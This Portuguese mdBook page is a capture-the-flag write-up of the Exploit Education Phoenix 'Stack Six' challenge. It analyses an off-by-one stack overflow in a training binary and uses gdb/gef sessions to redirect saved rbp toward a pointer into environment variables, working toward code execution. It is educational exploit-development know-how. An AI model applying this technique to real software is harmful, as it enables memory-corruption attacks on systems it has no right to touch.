<!DOCTYPE HTML>
<html lang="pt-br" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Stack Six</title>
        
        


        <!-- Custom HTML head -->
        


        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        
        <link rel="icon" href="../favicon.svg">
        
        
        <link rel="shortcut icon" href="../favicon.png">
        
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        
        <link rel="stylesheet" href="../css/print.css" media="print">
        

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        
        <link rel="stylesheet" href="../fonts/fonts.css">
        

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><div><strong aria-hidden="true">1.</strong> Intro</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">1.1.</strong> Jornada</div></li></ol></li><li class="chapter-item expanded "><a href="../phoenix/setup.html"><strong aria-hidden="true">2.</strong> Phoenix</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../phoenix/StackZero.html"><strong aria-hidden="true">2.1.</strong> Stack Zero</a></li><li class="chapter-item expanded "><a href="../phoenix/StackOne.html"><strong aria-hidden="true">2.2.</strong> Stack One</a></li><li class="chapter-item expanded "><a href="../phoenix/StackTwo.html"><strong aria-hidden="true">2.3.</strong> Stack Two</a></li><li class="chapter-item expanded "><a href="../phoenix/StackThree.html"><strong aria-hidden="true">2.4.</strong> Stack Three</a></li><li class="chapter-item expanded "><a href="../phoenix/StackFour.html"><strong aria-hidden="true">2.5.</strong> Stack Four</a></li><li class="chapter-item expanded "><a href="../phoenix/StackFive.html"><strong aria-hidden="true">2.6.</strong> Stack Five</a></li><li class="chapter-item expanded "><a href="../phoenix/StackSix.html" class="active"><strong aria-hidden="true">2.7.</strong> Stack Six</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.8.</strong> Heap One</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.9.</strong> Heap Two</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.10.</strong> Heap Three</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.11.</strong> Heap Four</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.12.</strong> Format Zero</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.13.</strong> Format One</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.14.</strong> Format Two</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.15.</strong> Format Three</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.16.</strong> Net One</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.17.</strong> Net Two</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.18.</strong> Net Three</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.19.</strong> Final One</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.20.</strong> Final Two</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Estilo OSCP</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">3.1.</strong> BrainPain</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> How to heap</div></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                        
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        
                        
                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1><a class="header" href="#explicação" id="explicação">Explicação</a></h1>
<h2><a class="header" href="#analisando-o-programa" id="analisando-o-programa">Analisando o programa</a></h2>
<h3><a class="header" href="#main" id="main">main</a></h3>
<pre><code>int main(int argc, char **argv) {
  char *ptr;
  printf(&quot;%s\n&quot;, BANNER);

#ifdef NEWARCH
  if (argv[1]) {
    what = argv[1];
  }
#endif

  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }

  printf(&quot;%s\n&quot;, greet(ptr));
  return 0;
}
</code></pre>
<p>Main começa definindo um pointer (ptr) e printando o banner</p>
<p>Em seguida, faz verificaçõs relacionadas à arquitetura do sistema usando o diretivo:
<code>#ifdef NEWARCH</code>. O diretivo <code>#ifdef NOME</code> checa se a macro chamda <code>NOME</code> existe.</p>
<p>Isso é usado para tornar o incio da mensagem de boas vindas (gerada por greet) ser dependente da arquitetura!</p>
<p>Por isso nos não a encontramos no codigo fonte! Mas caso usemos <code>strings</code> conseguimos encontra-las no binario:
<img src="https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20six/Messages_ARCH.png" alt="Diferença entre as arquiteturas" /></p>
<p>Em seguida, main salva o valor da env var &quot;ExploitEducation&quot; no pointer ptr</p>
<p>Depois, é checado se ptr é NULL (a env var não existe)</p>
<p>Caso não exista: usa a função errx() para enterromper a execução com uma mensagem de erro! errx() recebe 2 argumento: (codigo_do_erro, mensagem_do_erro)</p>
<p>No nosso caso:</p>
<pre><code>  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }
    // Codigo de erro: 1
   // Mensagem de erro: Por favor, especifique uma env var chamada ExploitEducation
</code></pre>
<p>Nos podemos confirmar isso usando: <code>echo $?</code>, que printa o codigo retornado pelo ultimo programa
<img src="https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20six/Exit_Codes_errx.png" alt="0 = sem erro, 1 = erro" /></p>
<blockquote>
<p>0 = sem erro, 1 = erro</p>
</blockquote>
<p>por ultimo, greet() é chamada, e o valor retornado por ela é printado!</p>
<p>E o programa finaliza retornando 0 (sem erro)!</p>
<h4><a class="header" href="#dica" id="dica">Dica</a></h4>
<p>Para definir uma env var no gdb</p>
<p><img src="https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20six/Exit_Codes_gdb.png" alt="set environment ExploitEducation=ABC" /></p>
<h3><a class="header" href="#greet" id="greet">greet</a></h3>
<pre><code>char *greet(char *who) {
  char buffer[128];
  int maxSize;

  maxSize = strlen(who);
  if (maxSize &gt; (sizeof(buffer) - /* ensure null termination */ 1)) {
    maxSize = sizeof(buffer) - 1;
  }

  strcpy(buffer, what);
  strncpy(buffer + strlen(buffer), who, maxSize);

  return strdup(buffer);
}
</code></pre>
<p>Agora chega a parte vulneravel! D:</p>
<p>greet recebe um argumento: &quot;who&quot; (quem recebe a mensagem de boas vindas)</p>
<p>São definidas duas variaveis locais: buffer[128] e maxSize (tamanho maximo)</p>
<p>O tamanho de who é salvo em maxSize</p>
<blockquote>
<p>Lembrete: Buffers são terminados com um NULL byte, portanto um buffer[128] só armazena 127 letras!</p>
</blockquote>
<p>Em seguida, é checado se maxSize é maior que o tamanho(buffer) - 1 (-1 por causa no null byte final)</p>
<p>Caso seja maior, maxSize vai ser denifido como o tamanho(buffer) - 1 (maxSize = 127)</p>
<blockquote>
<p>Portando, o limite de maxSize é 127</p>
</blockquote>
<p>Essa é uma tentativa de prevenir o buffer overflow! Pois, só seriam copiados 127 bytes, impedindo o overflow D:</p>
<p>Mas aqui que entra o problema: essa contagem não leva em consideração o inicio da mensagem (what)! Aquele que era dependente da arquitetura :D</p>
<p>Então nos vamos acabar escrevendo fora do buffer! Aqui esta a parte do codigo que causa a vulnerabilidade</p>
<pre><code>strcpy(buffer, what); // what = incio da mensagem
strncpy(buffer, who, maxSize); // who = o valor de ExploitEducation! Quem recebe o oi :D
</code></pre>
<p>Nos ja sabemos como o strcpy funciona (você passa um buffer como alvo e o que vamos salvar nele, ignorando tamanho! Caso nos conseguissemos controlar what, poderiamos facilmente exploitar o programa)</p>
<p>str<strong>N</strong>cpy é similar a strcpy, mas recebe um terceiro parametro: tamanho!</p>
<p>Esse tamanho é limitado à 127 (limite de maxSize), então teoricamente não seria exploitavel :(</p>
<p><strong>Mas espera ai, ja tinha coisa naquele buffer!!! O inicio da mensagem!!!</strong></p>
<p>O tamanho do inicio é 34 bytes (na versão amd64)</p>
<pre><code>$ python3
&gt;&gt;&gt; x = &quot;Welcome, I am pleased to meet you &quot;
&gt;&gt;&gt; len(x)
34
</code></pre>
<p>Isso quer dizer que no buffer cabem 128, mas foram colocados 34 + 127: Overflow!</p>
<p>Então se não fosse pelo inicio da mensagem, não seria exploitavel :D</p>
<p>Uma maneira de concertar essa vulnerabilidade seria: <code>strncpy(buffer, who, maxSize - sizeof(buffer))</code> (subtrair o tamanho atual)</p>
<h2><a class="header" href="#analisando-o-programa-asm" id="analisando-o-programa-asm">Analisando o programa (ASM)</a></h2>
<h3><a class="header" href="#main-1" id="main-1">main</a></h3>
<p>eu removi os endereços para caber na tela</p>
<pre><code>gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    -&gt; Prologo
sub    rsp,0x20


mov    DWORD PTR [rbp-0x14],edi
mov    QWORD PTR [rbp-0x20],rsi
mov    edi,0x400878
call   0x400530 &lt;puts@plt&gt;        -&gt; printar o banner


mov    edi,0x4008c2               -&gt; o 1º argumento é &quot;ExploitEducation&quot;
call   0x400520 &lt;getenv@plt&gt;      -&gt; Le as env vars e coloca &quot;ExploitEducation&quot; em rax


mov    QWORD PTR [rbp-0x8],rax    -&gt; Pointer para rax
cmp    QWORD PTR [rbp-0x8],0x0    -&gt; Compara esse pointer com 0x0 
                                    (Teoricamente &quot;cmp rax, 0x0&quot; tambem deveria funcionar,
                                    mas salvando nesse pointer, podemos usar o valor depois)
jne    0x4007dd &lt;main+66&gt;         -&gt; Jump not equal (pular se a comparação anterior for diferente)
                                    Mas pular para onde? Para main+66 (logo depois da mensagem de erro)
                                 Ou melhor: Caso ExploitEducation esteja definida, nos não emitimos erro

Essa parte só executa caso ExploitEducation não exista {
        mov    esi,0x4008d8               -&gt; 2º argumento
        mov    edi,0x1                    -&gt; 1º argumento
        mov    eax,0x0                    -&gt; Valor retornado por main
        call   0x400540 &lt;errx@plt&gt;        -&gt; Enterrompe a execução e sai com erro
}



        0x4007dd &lt;main+66&gt;:
mov    rax,QWORD PTR [rbp-0x8]      -&gt; Lembra daquele pointer que salvamos com o rax de getenv() ? 
                                      Coloca ele em rax de novo :D
mov    rdi,rax                      -&gt; 1º argumento: rax (o valor da env ExploitEducation)
call   0x4006fd &lt;greet&gt;             -&gt; Chama greet()
   
mov    rdi,rax                      -&gt; 1º argumento: O valor que greet retornou (salvo em rax)
call   0x400530 &lt;puts@plt&gt;          -&gt; Printa a mensagem de boas vindas para o terminal
   
   
mov    eax,0x0                      -&gt; Valor retornado por main: 0 (sem erro)
leave                               -&gt; Epilogo
ret    
</code></pre>
<p>Não é tão relevante analisar o assembly de greet para entender a vulnerabilidade, dado que temos o codigo fonte!</p>
<p>Mas caso queira, você pode analisar por conta própria e relacionar o ASM com o codigo fonte por treino :D</p>
<h2><a class="header" href="#fuzz" id="fuzz">Fuzz</a></h2>
<p>Agora que sabemos que é possivel realizar o overflow, vamos ver o que é corrompido :D</p>
<p>Nos só podemos colocar 127 no bytes no input, pois se colocarmos mais o programa simplesmente vai remove-los: então colocar 127 ou 200 teria o mesmo efeito! :)</p>
<p>Primeiro, vamos encontrar aonde colocaremos nossos breakpoints</p>
<pre><code>gef&gt; disassemble greet 
Dump of assembler code for function greet:
   0x00000000004006fd &lt;+0&gt;:	push   rbp
   0x00000000004006fe &lt;+1&gt;:	mov    rbp,rsp
   0x0000000000400701 &lt;+4&gt;:	push   rbx
   0x0000000000400702 &lt;+5&gt;:	sub    rsp,0xa8
.......
.......
   0x0000000000400798 &lt;+155&gt;:	pop    rbx
   0x0000000000400799 &lt;+156&gt;:	pop    rbp
   0x000000000040079a &lt;+157&gt;:	ret    
End of assembler dump
</code></pre>
<p>Vamos colocar uma no incio de greet e uma no final! :D</p>
<pre><code>gef&gt; b *0x4006fe 
Breakpoint 1 at 0x4006fe

gef&gt; b *0x40079a
Breakpoint 2 at 0x40079a
</code></pre>
<p>E vamos rodar com 127 As: </p>
<p>Obs: </p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=$(python -c &quot;print 'A' * 127&quot;)</p>
</blockquote>
<p>Deveria funcionar, mas não funciona sei la por que :(</p>
<p>Então eu rodei</p>
<blockquote>
<p>python -c &quot;print 'A' * 127&quot;</p>
</blockquote>
<p>Em outro terminal, e dei Ctrl+shift+C Ctrl+shift+V</p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p>
</blockquote>
<p>Agora, vamos rodar o programa <code>r</code>. Quando ele chegar no breakpoint 1 (inicio de greet), pode analisar o frame e ver aonde esta rbp!</p>
<pre><code>gef&gt; info frame
Stack level 0, frame at 0x7fffffffe590:
 rip = 0x4006fe in greet; saved rip = 0x4007e9
 called by frame at 0x7fffffffe5c0
 Arglist at 0x7fffffffe580, args: 
 Locals at 0x7fffffffe580, Previous frame's sp is 0x7fffffffe590
 Saved registers:
  rbp at 0x7fffffffe580, rip at 0x7fffffffe588                            &lt;- aqui
</code></pre>
<p>Agora que nos sabemos o endereço de RIP e RBP, podemos checar seu valores:</p>
<pre><code>endereço: valor

gef&gt; x/xg 0x7fffffffe580            -&gt; rbp
0x7fffffffe580:	0x00007fffffffe5b0
gef&gt; x/xg 0x7fffffffe588            -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<blockquote>
<p>Obs: o /xg é só para a formatação ficar legivel! Significa eXtra Grande (que é o tamanho do pointer na arquitetura amd64)!</p>
</blockquote>
<p>Isso quer dizer que no inicio de greet, os valores do RIP e RBP salvos na stack são: 0x00000000004007e9 e 0x00007fffffffe5b0</p>
<p>Agora vamos continuar a execução <code>c</code>, e ver se eles se alteram (lembrando greet é vulneravel)!</p>
<pre><code>gef&gt; c
---- output do gef ----
gef&gt; x/xg 0x7fffffffe580             -&gt; rbp
0x7fffffffe580:	0x00007fffffffe541
gef&gt; x/xg 0x7fffffffe588             -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<p>Eita! RBP foi alterado D:</p>
<blockquote>
<p>0x00007fffffffe5<strong>b0</strong> ---&gt;  0x00007fffffffe5<strong>41</strong></p>
</blockquote>
<p>Isso quer dizer que nós conseguimos controlar o ultimos byte do rbp salvo! Esse ultimo byte constuma ser chamado de LSB (Least Significant Byte, Byte menos significante)</p>
<p>Assim, quer dizer que esse buffer overflow é um BoF que corrompe o LSB, ou como é mais conhecido: <strong>off-by-one</strong> (errado por um)!</p>
<p>Esse tipo de buffer overflow é bem comum: vão esquecer de que o buffer termina com um <code>0x00</code> e vão comparar o input com o tamanho do buffer, ao enves do tamanho do buffer - 1. Assim, permitindo que seja escrito 1 byte fora do buffer!</p>
<h4><a class="header" href="#curiosidade" id="curiosidade">Curiosidade</a></h4>
<p>Lembra que o texto no inicio do buffer varia de arquitetura para aquitetura? Isso acontece pois cada uma aloca as variaveis em uma posição, otimizam de maneira diferente, etcetc!</p>
<p>Muitas vezes um <strong>off-by-one</strong> não vai ser exploitavel, pois o byte que vem logo depois do buffer não nescessariamente é o rbp! E esse é o nosso caso: existem outras variaveis dentro de greet!</p>
<p>Assim, quem desenvolveu o desafio nos fez o favor de colocar essa mensagem no inicio para compensar esse espaço!</p>
<p>Caso a mensagem fosse 1 byte maior, poderiamos controlar 2 bytes do rbp! Caso a mensagem fosse 1 byte MENOR, não conseguiriamos controlar o rbp! E caso a mensagem fosse 4 bytes a mais, como você pode imaginar, poderiamos controlar o RIP :D</p>
<p>E caso o programa nem cheque o input? Ai facilita bastante pra gente hehe :D ! É o caso do desafio passado!</p>
<p>Assim, esse desafio foi feito de uma maneira que vá nos ensinar como exploitar um <strong>off-by-one</strong> que nos da <strong>execução de codigo</strong></p>
<p>Na vida real, caso não existisse essa mensagem, só conseguiriamos exploitar esse off-by-one caso o nosso buffer estivesse adjacente ao rbp, isto é: não existe nenhuma outra variavel, ou o buffer foi alocado na parte mais baixa da stack(Do lado do RBP)!</p>
<pre><code>Nesse caso, nós nao conseguiriamos alterar RBP nem RIP,
portanto seria impossivel conseguir execução de codigo :(

O maximo que conseguimos fazer é corromper 1 byte de uma varivel!
._ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _  _ .
|    buffer      |   outras variaveis     | RBP | RIP | 
|_ _ _ _ _ _ _ _ |_ _ _ _ _ _ _ _ _ _ _ _ |_ _ _|_ _ _|

O impacto disso varia muito: não acontecer nada (mais comum), fazer o programa crashar, ou alterar
um valor importante (por exemplo, aquela varivel poderia armazenar o seu saldo do banco hehe ;) )...
</code></pre>
<h2><a class="header" href="#como-ir-de-off-by-one-para-execução-de-codigo" id="como-ir-de-off-by-one-para-execução-de-codigo">Como ir de off-by-one para execução de codigo</a></h2>
<p>Quando main chama <code>call greet</code>, ela salva o seu rbp e rip na stack!</p>
<p>Então esse rbp que estamos alterando é o rbp de main!</p>
<p>Quando greet retorna, main fica com o rbp errado!</p>
<p>Main vai ir ate o final da sua execução normalmente, na sua ultima instrução : <code>ret</code></p>
<p>resumindo, ret é um: <code>mov rsp rbp</code> (descer o rsp), <code>pop rbp</code> (desce o rsp 8 bytes (a stack diminui para valores maiores, então +8)), e <code>pop rip</code></p>
<p>Assim, caso mudemos o rbp para, por exemplo: 0x1234<strong>56</strong>, quando main retornar, o valor de 0x1234<strong>56</strong> vai para o rbp e o de 0x1234<strong>64</strong> (+8) para o rip</p>
<p>Portanto, precisamos achar um valor para colocar no rip que va apontar para codigo que controlamos, e apontar rbp para esse endereço <strong>-</strong> 8 :D</p>
<p>Então caso o pointer que precisamos esteja em 0x123456<strong>78</strong> e nos possamos controlar o ultimo byte do rbp: vamos colocar 0x123456<strong>70</strong> (-8) no rbp! E quando main retornar, o valor de 0x123456<strong>78</strong> vai para o rip</p>
<h1><a class="header" href="#exploit" id="exploit">Exploit</a></h1>
<p>Agora que sabemos o tipo de exploit que precisamos escrever, basta seguir os passos a seguir:</p>
<ol>
<li>Descobrir que partes da memoria controlamos</li>
<li>Encontrar para que região podemos apontar rbp</li>
<li>Encontrar um pointer nessa região que aponte para a parte que controlamos</li>
</ol>
<h2><a class="header" href="#o-que-controlamos" id="o-que-controlamos">O que controlamos?</a></h2>
<p>Normalmente, nos controlamos o input e as env vars, nesse caso o input é passado pelas env vars... portanto podemos falar que a unica região da memoria que
controlamos são as env vars</p>
<p>E qual é essa região? Vamos encontrar :D</p>
<h3><a class="header" href="#setup" id="setup">Setup</a></h3>
<p>As envs são diferentes dentro do gdb, nós podemos comparar usando </p>
<pre><code>Fora do gdb: env
Dentro do dbg: show environment
</code></pre>
<p>A diferença é: gdb adiciona &quot;LINES&quot; e &quot;COLUMNS&quot;, e &quot; _ &quot; (o programa sendo executando nesse momento, esta definido como &quot;/usr/local/bin/gdb&quot;)</p>
<pre><code>user@phoenix-amd64$ diff /tmp/gdb /tmp/env
16,18c16
&lt; _=/usr/local/bin/gdb
&lt; LINES=33
&lt; COLUMNS=168
---
&gt; _=/usr/bin/env
</code></pre>
<p>Para concertar essa diferença, e garantir que todos endereços estão certos, basta executar dentro do gdb:</p>
<pre><code>unset environment COLUMNS
unset environment LINES
set environment _=/opt/phoenix/amd64/stack-six

&gt; Aviso: Se você sair do gdb elas vão resetar!
</code></pre>
<h3><a class="header" href="#descobrir-que-partes-da-memoria-controlamos" id="descobrir-que-partes-da-memoria-controlamos">Descobrir que partes da memoria controlamos</a></h3>
<p>Colocando um breakpoint no inicio de main (<code>b *main</code>), vamos encontrar registers apontando para envs!
<img src="https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20six/envs_gef.png" alt="" /></p>
<p>Escolhendo o menor endereço e printando!</p>
<p><img src="https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20six/envs_addr.png" alt="" /></p>
<blockquote>
<p>Dica: vale a pena conferir se aquele realmente é o incio das envs, no nosso caso é :D</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20six/envs_addr2.png" alt="" /></p>
<p>Isso quer dizer que as envs estão de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<h3><a class="header" href="#encontrar-para-que-região-podemos-apontar-rbp" id="encontrar-para-que-região-podemos-apontar-rbp">Encontrar para que região podemos apontar rbp</a></h3>
<p>Nesse caso é facil ne? Se nós só podemos alterar o LSB, podemos alterar o RBP: de 0x00007fffffffe5<strong>00</strong> (inclusivo) a 0x00007fffffffe5<strong>ff</strong> (inclusivo)</p>
<h3><a class="header" href="#encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos" id="encontrar-um-pointer-nessa-região-que-aponte-para-a-parte-que-controlamos">Encontrar um pointer nessa região que aponte para a parte que controlamos</a></h3>
<p>Agora vamos usar uma utilidade do gef chamada <code>memwatch</code>! Sempre que o gef printar aquele output gigante, vai adicionar a região da memoria especificada!
Voce vai estar &quot;assistindo&quot; aquela região da memoria! :D</p>
<p>Nos vamos executar <code>gef&gt; memory watch 0x00007fffffffe500 32 qword</code></p>
<blockquote>
<p>Uma qword são 8 bytes, assim, 32 qwords são 256 bytes</p>
</blockquote>
<p>Agora, vamos ver quando main retorna, o que tem nessa região</p>
<pre><code>gef&gt; disassemble main
Dump of assembler code for function main:
....
   0x00000000004007f6 &lt;+91&gt;:	leave  
   0x00000000004007f7 &lt;+92&gt;:	ret

gef&gt; b *0x00000000004007f7
</code></pre>
<p>Agora basta executar o programa ate chegar la (obs, se voce ainda ta naquele breakpoint de main, basta continuar (<code>c</code>))</p>
<p><img src="https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20six/memwatch.png" alt="" /></p>
<p>Eita, bastante coisa!</p>
<p>Agora, entre esses endereços, precisamos encontrar um que tenha um pointer que aponte para a região da memoria que controlamos!</p>
<p>Pra facilitar isso, eu vou jogar todo o output do memwatch em um arquivo e usar grep</p>
<p>Todos os endereços da região que controlamos começam com <code>0x7fffffff</code>, então esse ja é um bom começo</p>
<pre><code>user@phoenix-amd64:/opt/phoenix/amd64$ cat /tmp/mem | grep &quot;0x00007fffffff&quot;
0x00007fffffffe500│+0x0000 0x0000000000000001
0x00007fffffffe508│+0x0008 0x00007ffff7db6d0f
0x00007fffffffe510│+0x0010 0x00007ffff7ffc948
0x00007fffffffe518│+0x0018 0x00000000000000a6
0x00007fffffffe520│+0x0020 0x00007fffffffe57f
0x00007fffffffe528│+0x0028 0x0000000000000001
0x00007fffffffe530│+0x0030 0x4141414141414141
0x00007fffffffe538│+0x0038 0x00007ffff7ffb300
0x00007fffffffe540│+0x0040 0x0000000000000000
0x00007fffffffe548│+0x0048 0x0000000000600c00
0x00007fffffffe550│+0x0050 0x000000000040079b
0x00007fffffffe558│+0x0058 0x0000000000000000
...
...
...
</code></pre>
<p>Isso reduz bastante, mas ainda não o suficiente: a gente precisa de <code>0x00007fffffff</code> no valor, e não no endereço</p>
<p>Para isso, podemos usar cut! Usando cut antes do grep nos estamos só levando os valores em consideração! Para facilitar, tambem podemos deixa-los em ordem crescente (sort)!</p>
<pre><code>user@phoenix-amd64:/opt/phoenix/amd64$ cat /tmp/mem | cut -d &quot; &quot; -f 2 | grep &quot;0x00007fffffff&quot; | sort
0x00007fffffffe541
0x00007fffffffe57f
0x00007fffffffe620
0x00007fffffffe628
0x00007fffffffe638
0x00007fffffffef10
</code></pre>
<p>as envs estão de: 0x7fffffff<strong>e817</strong> (inclusivo) a 0x7fffffff<strong>eff8</strong> (exclusivo)</p>
<p>O unico valor valido é <strong>0x00007fffffffef10</strong>, pois todos os outros são menores que 0x7fffffffe817 !</p>
<p>Agora, basta achar o endereço desse pointer! Portanto vamos tirar o cut :D</p>
<pre><code>user@phoenix-amd64:/opt/phoenix/amd64$ cat /tmp/mem | grep &quot;0x00007fffffffef10&quot;                     
0x00007fffffffe5c8│+0x00c8 0x00007fffffffef10
</code></pre>
<p>Porem, ainda tem um detalhe! Nos não queremos esse endereço no rbp! Nos queremos ele no rip!</p>
<p>Assim, nos vamos apontar RBP para o item de cima da lista! Ai quando main retornar (<code>pop rip</code>) o valor vai ser o correto!</p>
<p><img src="https://raw.githubusercontent.com/0xturazzi/Writeups/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/stack%20six/addr_rbp.png" alt="" /></p>
<p>Lembrando que, quando uma função retorna, o endereço 8 bytes maior que rbp, é onde o rbp esta! Então por definir <code>rbp = 0x00007fffffffe5c0</code>, nos 
estamos definindo <code>rip = 0x00007fffffffe5c8</code> então nos temos <code>RIP -&gt; 0x00007fffffffe5c8 -&gt; 0x00007fffffffef10 -&gt; env vars</code></p>
